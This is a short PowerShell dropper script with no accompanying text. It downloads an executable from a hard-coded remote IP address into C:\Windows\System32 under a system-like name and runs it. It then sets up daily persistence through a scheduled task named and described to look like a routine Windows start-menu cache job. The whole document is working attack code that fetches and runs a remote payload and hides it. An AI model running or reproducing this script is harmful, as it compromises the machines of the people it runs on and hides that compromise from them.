$saveLocation = "C:\Windows\System32\clinfo.exe";
$uriExt = "http://54.93.128.42:8080/getme";

powershell.exe invoke-webrequest -uri $uriExt -outfile $saveLocation;
start-process $saveLocation; 

$action = New-ScheduledTaskAction -Execute $saveLocation;
$trigger = New-ScheduledTaskTrigger -Daily -At 9am;

Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Optimize Start Menu Cache Files" -Description "This idle task reorganizes the cache files used to display the start menu.";
